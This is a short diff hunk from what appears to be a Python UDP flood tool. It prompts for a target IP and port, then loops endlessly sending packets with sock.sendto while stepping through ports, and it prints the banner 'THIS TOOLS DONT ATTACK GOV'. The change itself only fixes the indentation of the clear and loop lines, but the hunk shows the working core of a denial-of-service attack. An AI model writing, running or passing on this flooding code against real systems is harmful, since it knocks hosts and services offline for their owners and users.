@@ -24,8 +24,8 @@ print("THIS TOOLS DONT ATTACK GOV")
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
  
- os.system("clear")
- while True:
+os.system("clear")
+while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
